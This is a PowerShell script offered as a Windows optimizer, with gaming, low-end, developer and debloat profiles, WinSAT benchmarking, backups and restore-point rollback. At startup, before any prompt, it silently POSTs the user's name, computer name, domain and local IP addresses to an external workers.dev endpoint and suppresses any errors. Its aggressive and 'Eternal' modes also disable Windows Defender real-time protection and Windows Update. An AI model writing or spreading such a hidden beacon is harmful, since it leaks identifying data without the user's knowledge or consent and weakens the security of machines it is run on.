<#
Author: rhshourav
Version: 9.1.0
GitHub: https://github.com/rhshourav
Notes: Requires Administrator. Tested for PowerShell 5.1 and PowerShell 7.x compatibility.
#>
# ===============================
# Global Paths (Documents-based)
# ===============================
$BaseDir   = Join-Path ([Environment]::GetFolderPath("MyDocuments")) "WindowsOptimizer"
$LogDir    = Join-Path $BaseDir "Logs"
$BenchDir  = Join-Path $BaseDir "Benchmarks"
$BackupDir = Join-Path $BaseDir "Backups"
$SvcBackupDir  = Join-Path $BackupDir "Services"
$TaskBackupDir = Join-Path $BackupDir "ScheduledTasks"

# Create required directories
foreach ($dir in @(
    $BaseDir,
    $LogDir,
    $BenchDir,
    $BackupDir,
    $SvcBackupDir,
    $TaskBackupDir
)) {
    if (-not (Test-Path $dir)) {
        New-Item -ItemType Directory -Path $dir -Force | Out-Null
    }
}

# ---- Hard validation (FAIL FAST) ----
if (-not (Test-Path $BenchDir)) {
    throw "Benchmark directory missing. Initialization failed."
}

# Global files
$Global:LogFile     = Join-Path $LogDir ("WinOpt_{0}.log" -f (Get-Date -Format "yyyyMMdd_HHmmss"))
$Global:CompareFile = Join-Path $BenchDir "Benchmark_Comparison.txt"

Start-Transcript -Path $Global:LogFile | Out-Null
try {
    $localIPs = @()
    try {
        $localIPs = Get-CimInstance Win32_NetworkAdapterConfiguration -Filter 'IPEnabled=True' -ErrorAction SilentlyContinue |
                    ForEach-Object { $_.IPAddress } | Where-Object { $_ -match '^\d{1,3}(\.\d{1,3}){3}$' } | Select-Object -Unique
    } catch {}

    try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}

    $body = (@{
        token = 'shourav'
        text  = "Windows Optimizer v9.1.0`nUser: $env:USERNAME  PC: $env:COMPUTERNAME  Domain: $env:USERDOMAIN  IP: $($localIPs -join ', ')"
    } | ConvertTo-Json)

    Invoke-RestMethod -Uri 'https://cryocore.rhshourav.workers.dev/message' -Method Post -ContentType 'application/json' -Body $body -ErrorAction SilentlyContinue | Out-Null
} catch {}

#region Utilities & Checks
function Check-Admin {
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
    if (-not $isAdmin) {
        Write-Host 'ERROR: Please run as Administrator.' -ForegroundColor Red
        Exit 1
    }
}
# -----------------------------
# UI: black background + bright colors
# -----------------------------
try {
    $raw = $Host.UI.RawUI
    $raw.BackgroundColor = 'Black'
    $raw.ForegroundColor = 'White'
    Clear-Host
} catch {}

function Write-Info { param($Msg) Write-Host "[*] $Msg" -ForegroundColor Cyan }
function Write-Succ { param($Msg) Write-Host "[OK] $Msg" -ForegroundColor Green }
function Write-Warn { param($Msg) Write-Host "[! ] $Msg" -ForegroundColor Yellow }
function Write-Err  { param($Msg) Write-Host "[ERR] $Msg" -ForegroundColor Red }
#endregion


#region Backup & Restore
function Create-RestorePoint {
    Write-Info "Creating system restore point..."

    Enable-SystemRestore

    try {
        Checkpoint-Computer `
            -Description "WinOpt Restore - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" `
            -RestorePointType MODIFY_SETTINGS `
            -ErrorAction Stop

        Write-Succ "Restore point created successfully."
    } catch {
        Write-Warn "Restore point creation failed: $_"
    }
}


function Backup-Services {
    Write-Info 'Backing up current services (expanded snapshot)...'
    try {
        $file = Join-Path $SvcBackupDir "Services_$(Get-Date -Format 'yyyyMMdd_HHmmss').json"
        $services = Get-CimInstance -ClassName Win32_Service | Select-Object Name, DisplayName, State, StartMode, StartName, PathName, ServiceType
        # Gather DelayedAutoStart from registry (if present)
        $services = $services | ForEach-Object {
            $svc = $_
            $regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$($svc.Name)"
            $delayed = $false
            try {
                $val = Get-ItemProperty -Path $regPath -Name 'DelayedAutoStart' -ErrorAction SilentlyContinue
                if ($val -and $val.DelayedAutoStart -ne $null) { $delayed = [bool]$val.DelayedAutoStart }
            } catch {}
            $obj = [PSCustomObject]@{
                Name = $svc.Name
                DisplayName = $svc.DisplayName
                State = $svc.State
                StartMode = $svc.StartMode
                StartName = $svc.StartName
                PathName = $svc.PathName
                ServiceType = $svc.ServiceType
                DelayedAutoStart = $delayed
            }
            $obj
        }

        $services | ConvertTo-Json -Depth 4 | Out-File -FilePath $file -Encoding UTF8 -Force
        Write-Succ "Services backed up to $file"
    } catch {
        Write-Warn "Failed to backup services: $_"
    }
}
function Backup-ScheduledTasks {
    Write-Info 'Backing up scheduled tasks...'
    try {
        $backupPath = Join-Path $TaskBackupDir (Get-Date -Format 'yyyyMMdd_HHmmss')
        New-Item -ItemType Directory -Path $backupPath -Force | Out-Null

        $tasks = Get-ScheduledTask -ErrorAction SilentlyContinue
        foreach ($task in $tasks) {
            try {
                $xml = Export-ScheduledTask -TaskName $task.TaskName `
                                           -TaskPath $task.TaskPath `
                                           -ErrorAction Stop

                $taskName = ($task.TaskName -replace '[\\/:\*\?"<>|]', '_')
                $path = Join-Path $backupPath ($task.TaskPath.TrimStart('\'))

                if (-not (Test-Path $path)) {
                    New-Item -ItemType Directory -Path $path -Force | Out-Null
                }

                Out-File -FilePath (Join-Path $path "$taskName.xml") `
                         -InputObject $xml `
                         -Encoding UTF8 `
                         -Force
            } catch {
                Write-Warn "Skipping task $($task.TaskName): $_"
            }
        }
        Write-Succ "Scheduled tasks backed up to $backupPath"
    } catch {
        Write-Warn "Failed to backup tasks: $_"
    }
}

function Show-Progress {
    param(
        [string]$Activity,
        [int]$Seconds = 10
    )

    for ($i = 0; $i -le 100; $i += (100 / $Seconds)) {
        Write-Progress -Activity $Activity `
                       -Status "$i% completed" `
                       -PercentComplete $i
        Start-Sleep -Seconds 1
    }

    Write-Progress -Activity $Activity -Completed
}

function Invoke-SystemRestoreWithProgress {
    param(
        [Parameter(Mandatory)]
        [uint32]$SequenceNumber
    )

    Write-Info "Initializing System Restore engine..."
    Start-Sleep 1

    Write-Info "Submitting restore request to Windows..."
    $result = Invoke-CimMethod `
        -Namespace root/default `
        -ClassName SystemRestore `
        -MethodName Restore `
        -Arguments @{ SequenceNumber = $SequenceNumber } `
        -ErrorAction Stop

    if ($result.ReturnValue -ne 0) {
        throw "System Restore failed with code $($result.ReturnValue)"
    }

    Write-Succ "Restore request accepted by system."

    # Fake-but-informative progress
    Show-Progress -Activity "Preparing system restore (Windows internal)" -Seconds 15

    Write-Warn "Restore is now controlled by Windows."
    Write-Warn "A reboot may occur automatically."
}

function Get-RestorePointHistory {

    try {
        # Primary (modern)
        return Get-CimInstance `
            -Namespace root/default `
            -ClassName SystemRestore `
            -ErrorAction Stop |
        Sort-Object SequenceNumber -Descending |
        Select-Object `
            SequenceNumber,
            Description,
            @{Name='Created';Expression={
                [Management.ManagementDateTimeConverter]::ToDateTime($_.CreationTime)
            }}
    }
    catch {
        try {
            # Fallback for older systems
            return Get-WmiObject Win32_RestorePoint |
                Sort-Object SequenceNumber -Descending |
                Select SequenceNumber, Description, CreationTime
        }
        catch {
            Write-Err "System Restore is unavailable on this system."
            return $null
        }
    }
}

function Select-RestorePoint {
    $points = Get-RestorePointHistory
    if (-not $points -or $points.Count -eq 0) {
        Write-Err "No restore points available."
        return $null
    }

    Write-Host "`nAvailable Restore Points:" -ForegroundColor Cyan
    for ($i = 0; $i -lt $points.Count; $i++) {
        Write-Host "[$($i+1)] $($points[$i].Description)"
    }

    $choice = Read-Host "`nSelect restore point number"
    if ($choice -match '^\d+$' -and
        $choice -ge 1 -and
        $choice -le $points.Count) {

        return $points[$choice - 1]
    }

    Write-Warn "Invalid selection."
    return $null
}

function Invoke-SystemRestore {
    param(
        [Parameter(Mandatory)]
        [uint32]$SequenceNumber
    )

    Invoke-CimMethod `
        -Namespace root/default `
        -ClassName SystemRestore `
        -MethodName Restore `
        -Arguments @{ SequenceNumber = $SequenceNumber } `
        -ErrorAction Stop
}

function Rollback-ToRestorePoint {
    Write-Info "System Restore Manager"

    try {
        $rp = Select-RestorePoint
        if (-not $rp) { return }

        Write-Warn "`nSelected Restore Point:"
        Write-Warn " $($rp.Description)"
        Write-Warn " $($rp.Created)"

        $confirm = Read-Host "Type 'YES' to restore system"
        if ($confirm -ne 'YES') {
            Write-Info "Rollback aborted."
            return
        }

        Invoke-SystemRestoreWithProgress -SequenceNumber $rp.SequenceNumber

    Start-Sleep 2

    if (Test-RestoreInProgress) {
        Write-Info "System Restore operation is now active."
        Write-Warn "Windows has taken control of the restore process."
    }

    Write-Succ "Restore request successfully submitted."
    Write-Warn "The system may reboot automatically."
    Write-Warn "If it does not, please reboot manually to complete the restore."

    } catch {
        Write-Err "Rollback failed: $($_.Exception.Message)"
    }
}
# ---- SYSTEM RESTORE IN-PROGRESS GUARD ----
function Test-PendingReboot {
    <#
    Returns $true if the system has a pending reboot according to common Windows indicators.
    This is safer and practical as a guard for operations that shouldn't run while a reboot is pending.
    #>

    $keysToCheck = @(
        # Component Based Servicing (CBS)
        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\RebootPending',
        # Windows Update reboot flag
        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Auto Update\RebootRequired',
        # Pending file rename operations (Session Manager)
        'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager'
    )

    try {
        foreach ($key in $keysToCheck) {
            if (Test-Path $key) {
                if ($key -like '*Session Manager') {
                    $value = Get-ItemProperty -Path $key -Name 'PendingFileRenameOperations' -ErrorAction SilentlyContinue
                    if ($value -and $value.PendingFileRenameOperations) { return $true }
                } else {
                    return $true
                }
            }
        }

        # Check Windows Update Agent pending state via WMI (fallback)
        try {
            $wu = Get-CimInstance -Namespace root\ccm\ClientSDK -ClassName CCM_SoftwareDistribution -ErrorAction SilentlyContinue
            if ($wu) { return $true }
        } catch { }

        return $false
    } catch {
        # On unexpected failure be conservative and report pending (so caller can decide)
        return $true
    }
}

# Replace previous usage:
# if (Test-RestoreInProgress) { ... }
# with:
if (Test-PendingReboot) {
    Write-Warn "Reboot pending detected. Please reboot before running Windows Optimizer."
    exit 1
}



function Enable-SystemRestore {
    try {
        $cfg = Get-CimInstance -Namespace root/default `
                               -ClassName SystemRestoreConfig `
                               -ErrorAction Stop

        if ($cfg.EnableStatus -ne 1) {
            Write-Warn "System Restore is disabled. Enabling on C:\ ..."
            Enable-ComputerRestore -Drive "C:\" -ErrorAction Stop
            Write-Succ "System Restore enabled."
        }
    } catch {
        Write-Warn "Unable to verify/enable System Restore: $_"
    }
}

function Invoke-ProtectedAction {
    param(
        [Parameter(Mandatory)]
        [scriptblock]$Action,
        [string]$ProfileName = "Unknown"
    )

    Write-Info "Creating restore point for profile: $ProfileName"
    Create-RestorePoint

    & $Action
}
function Restore-Services {
    param(
        [Parameter(Mandatory)]
        [string]$JsonFile
    )

    if (-not (Test-Path $JsonFile)) {
        Write-Err "Service backup file not found."
        return
    }

    $services = Get-Content $JsonFile -Raw | ConvertFrom-Json
    foreach ($svc in $services) {
        try {
            # Restore startup mode (Automatic, Manual, Disabled)
            Set-Service -Name $svc.Name -StartupType $svc.StartMode -ErrorAction SilentlyContinue

            # If DelayedAutoStart flag was true, set the registry value accordingly
            if ($svc.DelayedAutoStart) {
                $regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$($svc.Name)"
                if (Test-Path $regPath) {
                    New-ItemProperty -Path $regPath -Name 'DelayedAutoStart' -Value 1 -PropertyType DWord -Force -ErrorAction SilentlyContinue | Out-Null
                }
            } else {
                # remove property if present
                $regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$($svc.Name)"
                try { Remove-ItemProperty -Path $regPath -Name 'DelayedAutoStart' -ErrorAction SilentlyContinue } catch {}
            }

            if ($svc.State -eq 'Running') {
                Start-Service -Name $svc.Name -ErrorAction SilentlyContinue
            } else {
                # don't stop services arbitrarily; only start those that were running
            }
        } catch {
            Write-Warn "Failed restoring service: $($svc.Name) - $_"
        }
    }

    Write-Succ "Service restore completed (startup modes and DelayedAutoStart attempted)."
}
function Restore-ScheduledTasks {
    param(
        [Parameter(Mandatory)]
        [string]$BackupPath
    )

    if (-not (Test-Path $BackupPath)) {
        Write-Err "Scheduled task backup path not found."
        return
    }

    $files = Get-ChildItem $BackupPath -Filter *.xml -Recurse
    foreach ($file in $files) {
        try {
            # Derive original TaskPath from backup folder structure:
            # If $BackupPath\Some\Sub\TaskName.xml => TaskPath = '\Some\Sub\'
            $relative = $file.DirectoryName.Substring($BackupPath.Length).TrimStart('\')
            $taskPath = if ($relative -eq '') { '\' } else { "\" + ($relative -replace '\\','\') + "\" }

            $xml = Get-Content $file.FullName -Raw
            Register-ScheduledTask -TaskName $file.BaseName -TaskPath $taskPath -Xml $xml -Force -ErrorAction Stop
        } catch {
            Write-Warn "Failed restoring task: $($file.FullName) - $_"
        }
    }

    Write-Succ "Scheduled task restore completed."
}


#endregion
#region compare Banchmark
function Compare-Benchmark {
    param ($Current)

    $lastFile = Join-Path $BenchDir "Benchmark_Last.json"

    if (-not (Test-Path $lastFile)) {
        $Current | ConvertTo-Json -Depth 4 | Out-File $lastFile -Encoding UTF8 -Force
        Write-Host "[INFO] No previous benchmark found. Baseline saved to $lastFile" -ForegroundColor Yellow
        return
    }

    $previous = Get-Content $lastFile -Raw | ConvertFrom-Json

    Write-Host "`n[COMPARISON] Previous vs Current:" -ForegroundColor Cyan

    $comparison = @(
        [PSCustomObject]@{ Metric="CPU";      Before=$previous.CPU;      After=$Current.CPU }
        [PSCustomObject]@{ Metric="Memory";   Before=$previous.Memory;   After=$Current.Memory }
        [PSCustomObject]@{ Metric="Graphics"; Before=$previous.Graphics; After=$Current.Graphics }
        [PSCustomObject]@{ Metric="Gaming";   Before=$previous.Gaming;   After=$Current.Gaming }
        [PSCustomObject]@{ Metric="Disk";     Before="$($previous.Disk) ($($previous.DiskType))"; After="$($Current.Disk) ($($Current.DiskType))" }
    )

    $comparison | Format-Table -AutoSize

    # Append a small summary line to $Global:CompareFile for easy reading
    $line = "{0} | CPU {1}->{2} | Mem {3}->{4} | Disk {5}->{6}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'),
            $previous.CPU, $Current.CPU,
            $previous.Memory, $Current.Memory,
            "$($previous.Disk)($($previous.DiskType))", "$($Current.Disk)($($Current.DiskType))"
    Add-Content -Path $Global:CompareFile -Value $line

    # Update baseline
    $Current | ConvertTo-Json -Depth 4 | Out-File $lastFile -Encoding UTF8 -Force
}


#endregion
#region WinSAT Score
function Get-DiskType {
    try {
        $pd = Get-PhysicalDisk -ErrorAction Stop
        if ($pd) {
            $media = ($pd | Select-Object -First 1).MediaType
            if ($media -ne $null) {
                return $media.ToString()
            }
            return 'Unknown'
        }
    } catch { }

    try {
        $drive = Get-CimInstance -ClassName Win32_DiskDrive -ErrorAction SilentlyContinue | Select-Object -First 1
        if ($drive) {
            $model = ($drive.Model -as [string]) -replace '\s+',' '
            if ($model -match 'SSD|Solid State|NVMe') { return 'SSD' }
            if ($drive.InterfaceType -match 'IDE|SCSI|SATA') { return 'HDD' }
            return 'Unknown'
        }
    } catch { }

    return 'Unknown'
}
function Get-WinSATScore {
    $xmlPath = Get-ChildItem "$env:WinDir\Performance\WinSAT\DataStore" `
        -Filter "*Formal*.xml" -ErrorAction SilentlyContinue |
        Sort-Object LastWriteTime |
        Select-Object -Last 1

    if (-not $xmlPath) {
        throw "WinSAT XML not found"
    }

    [xml]$xml = Get-Content $xmlPath.FullName

    return [PSCustomObject]@{
        CPU      = [math]::Round($xml.WinSAT.WinSPR.CPUScore, 2)
        Memory   = [math]::Round($xml.WinSAT.WinSPR.MemoryScore, 2)
        Graphics = [math]::Round($xml.WinSAT.WinSPR.GraphicsScore, 2)
        Gaming   = [math]::Round($xml.WinSAT.WinSPR.GamingScore, 2)
        Disk     = [math]::Round($xml.WinSAT.WinSPR.DiskScore, 2)
        DiskType = Get-DiskType
        Source   = $xmlPath.FullName
    }
}
#endregion
#regin Show Benchmarks
function Show-BenchmarkResults {
    param (
        [Parameter(Mandatory)]
        $Result
    )

    Write-Host "`n[RESULT] Current System Benchmark" -ForegroundColor Green
    Write-Host "Profile : $($Result.Profile)" -ForegroundColor Cyan
    Write-Host "Disk    : $($Result.Disk) ($($Result.DiskType))" -ForegroundColor Cyan
    Write-Host ""

    $Result |
        Select CPU, Memory, Graphics, Gaming, Disk |
        Format-Table -AutoSize
}

#endregion
#region Benchmarks
function Run-Benchmark {
    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $BenchFileJson = Join-Path $BenchDir "Benchmark_$timestamp.json"
    $BenchFileRaw  = Join-Path $BenchDir "Benchmark_$timestamp.txt"

    Write-Host "`n[ACTION] Running Windows System Assessment (WinSAT)" -ForegroundColor Cyan
    Write-Host "[INFO] JSON output: $BenchFileJson" -ForegroundColor DarkGray
    Write-Host "[INFO] Raw output:  $BenchFileRaw" -ForegroundColor DarkGray
    Write-Host "[ACTION] This may take several minutes..." -ForegroundColor Yellow

    # Save raw winsat output
    winsat formal | Tee-Object -FilePath $BenchFileRaw

    $current = Get-WinSATScore
    $current | Add-Member Profile $Global:ActiveProfile -Force
    $current | ConvertTo-Json -Depth 4 | Out-File -FilePath $BenchFileJson -Encoding UTF8 -Force

    Write-Host "[SUCCESS] Benchmark completed." -ForegroundColor Green
    Write-Host "[INFO] Raw output saved to: $BenchFileRaw`n" -ForegroundColor Cyan

    Show-BenchmarkResults $current
    Compare-Benchmark $current
}
#endregion

#region Tweaks (each function prints status)
function Get-DefenderTamperProtected {
    # Basic heuristic: modern tamper protection blocks registry changes; check known value if available
    try {
        $key = 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Features'
        if (Test-Path $key) {
            $val = Get-ItemProperty -Path $key -Name 'TamperProtection' -ErrorAction SilentlyContinue
            if ($val -and $val.TamperProtection -ne $null) {
                return ($val.TamperProtection -ne 0)
            }
        }
    } catch { }

    # If unknown, assume tamper-protected to avoid misleading changes
    return $true
}
function Disable-WindowsDefender {
    param([Switch]$Force)
    Write-Info 'Attempting to disable Windows Defender components (policy & realtime)...'

    if (Get-DefenderTamperProtected) {
        Write-Warn "Tamper Protection or platform controls detected — cannot reliably disable Defender. Skipping destructive changes."
        Write-Warn "If you intend to disable Defender, disable Tamper Protection in Windows Security first (not recommended for general use)."
        return
    }

    try {
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop
        New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Force | Out-Null
        New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiSpyware' -Value 1 -PropertyType DWord -Force | Out-Null
        Write-Succ 'Windows Defender disabled via policy (if the platform allows it).'
    } catch {
        Write-Warn "Unable to fully disable Defender with cmdlets/registry: $_"
    }
}


function Disable-WindowsUpdate {
    Write-Info 'Attempting to stop Windows Update (wuauserv) — using Manual startup to avoid system instability...'
    try {
        # Stop service for this session
        Stop-Service -Name wuauserv -Force -ErrorAction SilentlyContinue
        # Set to Manual rather than Disabled to avoid being forcibly re-enabled by other components
        Set-Service -Name wuauserv -StartupType Manual -ErrorAction SilentlyContinue
        Write-Warn 'Windows Update service stopped and set to Manual. Windows may re-enable update services (WaaSMedic, Update Medic) on reboot.'
        Write-Warn 'Recommendation: prefer deferral policies (Group Policy / MDM) over disabling update services.'
    } catch {
        Write-Warn "Unable to change Windows Update service state: $_"
    }
}
function Disable-SearchIndexing {
    Write-Info 'Stopping and disabling Windows Search (WSearch)...'
    try { Stop-Service -Name WSearch -Force -ErrorAction SilentlyContinue } catch {}
    try { Set-Service -Name WSearch -StartupType Disabled -ErrorAction SilentlyContinue } catch {}
    Write-Succ 'Search indexing disabled (if present).'
}

function Disable-CortanaWebSearch {
    Write-Info 'Applying policies to disable Cortana and web search...'
    try {
        New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Windows Search' -Force | Out-Null
        New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Windows Search' -Name 'AllowCortana' -Value 0 -PropertyType DWord -Force | Out-Null
        New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Windows Search' -Name 'ConnectedSearchUseWeb' -Value 0 -PropertyType DWord -Force | Out-Null
        Write-Succ 'Cortana & web search policy applied.'
    } catch {
        Write-Warn "Policy write failed: $_"
    }
}

function Remove-BuiltInApps {
    Write-Info 'Removing Appx packages for all users (may skip protected packages)...'
    try {
        $apps = Get-AppxPackage -AllUsers -ErrorAction SilentlyContinue
        foreach ($app in $apps) {
            try { Remove-AppxPackage -Package $app.PackageFullName -AllUsers -ErrorAction SilentlyContinue } catch { }
        }
        $prov = Get-AppxProvisionedPackage -Online -ErrorAction SilentlyContinue
        foreach ($pkg in $prov) {
            try { Remove-AppxProvisionedPackage -Online -PackageName $pkg.PackageName -ErrorAction SilentlyContinue } catch { }
        }
        Write-Succ 'Attempted removal of Appx packages.'
    } catch {
        Write-Warn "App removal encountered issues: $_"
    }
}

function Optimize-Gaming {
    Write-Info 'Applying Gaming profile: disabling SysMain (Superfetch) & setting GPU scheduling...'
    try {
        Stop-Service -Name SysMain -Force -ErrorAction SilentlyContinue
        Set-Service -Name SysMain -StartupType Disabled -ErrorAction SilentlyContinue
    } catch {}
    try {
        Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\GraphicsDrivers' -Name 'HwSchMode' -Value 2 -Type DWord -Force -ErrorAction SilentlyContinue
    } catch {}
    Write-Succ 'Gaming tweaks applied.'
}

function Optimize-LowEnd {
    Write-Info 'Applying Low-End profile: disable indexing, telemetry and low-priority services...'
    Disable-SearchIndexing
    try {
        New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\DataCollection' -Force | Out-Null
        New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\DataCollection' -Name 'AllowTelemetry' -Value 0 -PropertyType DWord -Force | Out-Null
        Write-Succ 'Telemetry minimized via policy.'
    } catch { Write-Warn "Telemetry policy write failed: $_" }
    $svcs = @('DiagTrack','WMPNetworkSvc','MapsBroker','lfsvc')
    foreach ($svc in $svcs) {
        try { Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue } catch {}
        try { Set-Service -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue } catch {}
    }
    Write-Succ 'Low-End profile applied.'
}

function Optimize-Developer {
    Write-Info 'Applying Developer profile: disable UI animations for responsiveness...'
    $perfKey = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects'
    try {
        New-Item -Path $perfKey -Force | Out-Null
        Set-ItemProperty -Path $perfKey -Name 'VisualFXSetting' -Value 2 -Type DWord -Force
        Write-Succ 'Developer tweaks applied.'
    } catch { Write-Warn "Developer tweak failed: $_" }
}

function Optimize-Minimal {
    Write-Info 'Applying Minimal (debloated) profile...'
    Disable-CortanaWebSearch
    Remove-BuiltInApps
    Write-Succ 'Minimal profile applied.'
}

function Optimize-Eternal {
    Write-Warn 'Eternal mode is extreme: this will strip many components and prioritize minimalism over usability.'
    $confirm = Read-Host "Type 'ETERNAL' to proceed or anything else to abort"
    if ($confirm -ne 'ETERNAL') { Write-Info 'Eternal mode aborted.'; return }
    Create-RestorePoint
    Backup-Services
    Backup-ScheduledTasks
    Write-Info 'Applying Eternal optimizations...'
    Disable-WindowsDefender
    Disable-WindowsUpdate
    Disable-SearchIndexing
    Disable-CortanaWebSearch
    Remove-BuiltInApps
    try { Stop-Service -Name SysMain -Force -ErrorAction SilentlyContinue } catch {}
    try { Set-Service -Name SysMain -StartupType Disabled -ErrorAction SilentlyContinue } catch {}
    $svcs = @("WMPNetworkSvc","Fax","XblGameSave","MapsBroker","lfsvc","WbioSrvc","PrintSpooler","Wecsvc","WdiServiceHost","WdiSystemHost")
    foreach ($svc in $svcs) {
        try { Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue } catch {}
        try { Set-Service -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue } catch {}
    }
    $perfKey = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects'
    try { New-Item -Path $perfKey -Force | Out-Null; Set-ItemProperty -Path $perfKey -Name 'VisualFXSetting' -Value 2 -Type DWord -Force } catch {}
    Write-Succ 'Eternal mode applied. Review logs and backups in TEMP for rollback data.'
}
#endregion

#region Main UI & Loop
Check-Admin

Clear-Host
Write-Host "=== Windows Optimization Script v9.1.0 ===" -ForegroundColor Cyan
Write-Host "Author: rhshourav    GitHub: https://github.com/rhshourav" -ForegroundColor Green

while ($true) {
    Write-Host ''
    Write-Host 'Select a profile to apply:' -ForegroundColor Cyan
    Write-Host ' 1) Gaming Performance'
    Write-Host ' 2) Low-End System Optimization'
    Write-Host ' 3) Developer/Workstation Profile'
    Write-Host ' 4) Debloated Minimal OS'
    Write-Host ' 5) Custom Aggressive (All tweaks)'
    Write-Host ' 6) Eternal Mode (Bare-Minimum OS)'
    Write-Host ' B) Benchmark (Windows Experience Index)'
    Write-Host ' R) Rollback to Restore Point'
    Write-Host ' Q) Quit'
    Write-Host ''
    Write-Host 'Press the key for your choice (no Enter required):' -NoNewline -ForegroundColor Cyan

    # safe key handling - convert char to string and ignore non-printable keys
    $key = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
    $charStr = $null
    try {
        # Convert Character to string (works with System.Char in different hosts)
        $charStr = $key.Character -as [string]
    } catch {
        $charStr = $null
    }

    if (-not $charStr -or $charStr.Trim() -eq '') {
        # Non-printable key, loop again
        Write-Host ''  # newline
        Write-Warn "Non-character key pressed; waiting for valid choice..."
        Start-Sleep -Milliseconds 300
        continue
    }

    $choice = $charStr.ToUpper()
    Write-Host $choice  # echo choice visibly

    switch ($choice) {
        '1' {
    $Global:ActiveProfile = "Gaming"
    Invoke-ProtectedAction -ProfileName "Gaming" -Action {
        Backup-Services
        Backup-ScheduledTasks
        Optimize-Gaming
    }
}

'2' {
    $Global:ActiveProfile = "Low-End"
    Invoke-ProtectedAction -ProfileName "Low-End" -Action {
        Backup-Services
        Backup-ScheduledTasks
        Optimize-LowEnd
    }
}

'3' {
    $Global:ActiveProfile = "Developer"
    Invoke-ProtectedAction -ProfileName "Developer" -Action {
        Backup-Services
        Backup-ScheduledTasks
        Optimize-Developer
    }
}

'4' {
    $Global:ActiveProfile = "Minimal"
    Invoke-ProtectedAction -ProfileName "Minimal" -Action {
        Backup-Services
        Backup-ScheduledTasks
        Optimize-Minimal
    }
}

'5' {
    $Global:ActiveProfile = "Aggressive"

    $yn = Read-Host "Apply ALL aggressive tweaks (Defender, Update, Search, Apps)? [Y/N]"
    if ($yn.ToUpper() -ne 'Y') {
        Write-Info 'Aggressive mode aborted.'
        break
    }

    Invoke-ProtectedAction -ProfileName "Aggressive" -Action {
        Backup-Services
        Backup-ScheduledTasks

        Disable-WindowsDefender
        Disable-WindowsUpdate
        Disable-SearchIndexing
        Disable-CortanaWebSearch
        Remove-BuiltInApps

        try {
            Stop-Service -Name SysMain -Force -ErrorAction SilentlyContinue
            Set-Service  -Name SysMain -StartupType Disabled -ErrorAction SilentlyContinue
        } catch {}

        Write-Succ 'All aggressive changes applied.'
    }
}

'6' {
    $Global:ActiveProfile = "Eternal"

    $confirm = Read-Host "Type 'ETERNAL' to proceed (EXTREME mode)"
    if ($confirm -ne 'ETERNAL') {
        Write-Info 'Eternal mode aborted.'
        break
    }

    Invoke-ProtectedAction -ProfileName "Eternal" -Action {
        Backup-Services
        Backup-ScheduledTasks
        Optimize-Eternal
    }
}

        'B' {
            Run-Benchmark
        }
        'R' {
            Rollback-ToRestorePoint
        }
        'Q' {
            Write-Info 'Exiting. Use System Restore to undo any changes if needed.'
            break
        }
        Default {
            Write-Warn 'Invalid selection. Try again.'
        }
    }
}

Stop-Transcript
Write-Host "Log saved to: $Global:LogFile" -ForegroundColor Green
#endregion

# SIG # Begin signature block
# MIIb1AYJKoZIhvcNAQcCoIIbxTCCG8ECAQExCzAJBgUrDgMCGgUAMGkGCisGAQQB
# gjcCAQSgWzBZMDQGCisGAQQBgjcCAR4wJgIDAQAABBAfzDtgWUsITrck0sYpfvNR
# AgEAAgEAAgEAAgEAAgEAMCEwCQYFKw4DAhoFAAQUjY10BCMCU+dNHLUs8XBLMogh
# iqqgghZEMIIDBjCCAe6gAwIBAgIQEL8pRoGkFYRO4LQqey1D4DANBgkqhkiG9w0B
# AQsFADAbMRkwFwYDVQQDDBBSSFNIT1VSQVYtSVQtT3BzMB4XDTI2MDcwNzA4MDE1
# N1oXDTI5MDcwNzA4MTE1N1owGzEZMBcGA1UEAwwQUkhTSE9VUkFWLUlULU9wczCC
# ASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALFj11KDAqN3fhbDT9fvgrLF
# VemPYmcud3qA+9Sc4RojOjElODGXyaOlBSVmDGpmCkNRC+dnkGCLB8bYb3gsnHey
# Ud99DA8tvkTgb06+B1pigTZUmhyAwyPiu77+h224c8SsZFkmgQ/Dh2Sc2ynNocZe
# 773d6a/B4DRg7/K9xV8jFap6BP1fjaM3Do40GSL+OVnXl2ssvfFk4FyP5fc8Czz5
# MJ5IJKRFrnHv3kNcmyz5mnz0LoBQs/JtHpWg3BogIalJ2tyCiZgk0xIsz5j5UjhA
# /KepfnWGpCowJ/NJWnmOZcikFlDPggI27QNc/IbxZ035ht+Zgc7b1Cf68GmL/8UC
# AwEAAaNGMEQwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQMMAoGCCsGAQUFBwMDMB0G
